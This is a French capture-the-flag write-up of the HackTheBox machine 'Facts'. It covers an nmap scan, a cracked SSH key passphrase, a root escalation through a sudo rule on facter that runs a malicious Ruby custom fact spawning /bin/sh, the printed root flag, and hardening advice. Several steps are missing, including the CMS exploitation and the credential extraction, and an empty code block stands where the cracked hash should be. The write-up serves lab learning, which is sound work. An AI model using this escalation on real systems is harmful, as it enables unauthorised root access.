### Summary

Facts est une machine `hackthebox` focalisée sur l’exploitation de Camaleon CMS, l'extraction de credentials AWS S3 et l'escalade de privilèges via Facter.

### Host Resolution

Nous allons commencer par associer l’adresse ip de notre cible au nom de domaine `facts.htb`

```bash
echo "10.129.26.235 facts.htb" >> /etc/hosts
```

### Nmap Scan

La reconnaissance a débuté par un scan `nmap` de la cible afin de déterminer les ports ouverts

```bash
nmap -sC -sV -p- facts.htb
```

On a obtenu

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

### **Web Application Discovery**

Après l’identification du port 80 comme principale surface d'attaque lors de l'analyse Nmap, nous avons interagi avec ce port via le navigateur à l’adresse

```
http://facts.htb
```

Le site utilise Camaleon CMS, une plateforme open source basée sur Ruby on Rails. Cette application présente plusieurs vulnérabilités notamment dans la gestion des fichiers et l'accès aux configurations sensibles.

Nous allons ensuite utiliser `John The Ripper` pour déterminer la passphrase qui protège cette clé


John a réussi à craquer ce hash

```bash

```

Nous pouvons donc maintenant nous servir de la clé SSH pour une authentification sans mot de passe

### Capture User Flag

En essayant d’utiliser la clé récupéré pour nous connecter , seul l’authentification, en tant qu’utilisateur `trivia` réussit

```bash

# ssh  trivia@facts.htb -i id_ed25519
```

**Passphrase** : `dragonballz`

### Privilege Escalation

Vérifions les droits `sudo` de l’utilisateur

```bash
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

L’utilisateur peut donc lancer la commande `/usr/bin/facter` en  tant que `root` sans devoir fournir de mot de passe. 

`Facter` est un outil Ruby qui collecte des `facts` (infos système). Il supporte des `custom facts` : des fichiers `.rb` que l’on place dans un répertoire, et que Facter exécute comme du code Ruby. Il peut être détourner pour réaliser une escalade de privilèges: il suffit de créer notre propre dossier et d’y  ajouter un script en `.rb` malveillant

```bash
TF=$(mktemp -d)                        
echo 'exec("/bin/sh")' > $TF/x.rb
sudo facter --custom-dir $TF 
```

On obtient ainsi un shell root

### Capture Root Flag

Une fois le shell root obtenu nous pouvons récupérer le root flag

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
# bash
root@facts:/home/trivia# ls /root
minio-binaries  ministack  root.txt  snap
root@facts:/home/trivia# cat /root/root.txt 
91a09ed83a791dc8a50fa4a1991d8066
root@facts:/home/trivia# 
```

⛳ **Root Flag :** `91a09ed83a791dc8a50fa4a1991d8066`

### Quelques recommendations

- CVE-2024-46987 et CVE-2025-2304: Passer à la dernière version de Camaleon CMS qui corrige ces failles critiques
- Ne jamais exposer des clés d'accès cloud (AWS/S3) dans l'interface d'administration d'une application web. Ces credentials doivent être gérés via des variables d'environnement ou un vault et ne jamais être lisibles par des utilisateurs applicatifs.
- Ne jamais stocker des clés SSH privées dans un bucket cloud et séparer les données applicatives et système
- L'entrée sudoers `NOPASSWD: /usr/bin/facter` sans restriction des arguments permet à tout utilisateur d'injecter un `--custom-dir` arbitraire. La règle doit soit interdire l'option `--custom-dir`, soit supprimer complètement le droit sudo sur `facter` si son usage privilégié n'est pas nécessaire.
- Appliquer le principe de moindre privilège en accordant aux utilisateurs uniquement les droits dont ils ont besoins
